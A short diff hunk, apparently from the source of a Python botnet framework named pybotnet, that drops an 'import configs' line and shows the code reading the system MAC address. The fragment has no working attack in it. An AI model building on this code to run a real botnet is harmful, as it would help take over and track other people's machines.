@@ -12,7 +12,6 @@ from requests import get
 # pybotnet import
 from . import util
 from . import settings
-import configs
 
 MAC_ADDRES = str(get_system_mac_addres())
 
